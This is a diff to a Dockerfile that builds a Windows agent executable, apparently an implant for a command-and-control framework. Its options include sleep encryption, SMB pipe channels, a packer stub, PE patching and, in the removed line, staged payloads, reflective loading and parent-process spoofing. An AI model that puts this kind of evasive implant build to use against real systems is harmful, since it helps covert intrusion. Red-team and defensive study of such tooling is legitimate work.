@@ -26,10 +26,9 @@ ARG DM_SLEEP_ENCRYPT=false
 ARG DM_FEATURES=
 ARG DM_SMB_HOST=
 ARG DM_SMB_PIPE=
-# Set to true to also produce dm-stub.exe (the packer stub).
-# DM_STAGER_FEATURES controls which features are compiled into the embedded stager.
+# Set to true to also produce dm-stub.exe (packer stub).
+# The stub wraps whatever binary DM_FEATURES produced — no separate stager rebuild.
 ARG DM_PACK_STAGER=false
-ARG DM_STAGER_FEATURES=staged-payload,udrl,ppid-spoof,channel-https
 
 ENV DM_TARGET=$DM_TARGET \
     DM_BIN=$DM_BIN \
@@ -77,8 +76,6 @@ RUN --mount=type=cache,id=dm-cargo-registry,target=/root/.cargo/registry \
     --mount=type=cache,id=dm-cargo-git,target=/root/.cargo/git \
     --mount=type=cache,id=dm-cargo-target,target=/build/target,sharing=locked \
     if [ "$DM_PACK_STAGER" = "true" ]; then \
-        cargo build --release --bin dm-agent --target $DM_TARGET \
-            --features "${DM_STAGER_FEATURES}" && \
         STAGER=/build/target/${DM_TARGET}/release/dm-agent.exe && \
         python3 /deploy/pe_patch.py "$STAGER" --inplace && \
         DM_STAGER_PATH="$STAGER" \
@@ -88,4 +85,6 @@ RUN --mount=type=cache,id=dm-cargo-registry,target=/root/.cargo/registry \
     fi
 
 FROM alpine:3.20
-COPY --from=builder /output/ /output/
+# Copy all built artifacts from /output/ to / so the server's
+# docker-run extract step (cp /dm-agent.exe /out/...) still works.
+COPY --from=builder /output/ /
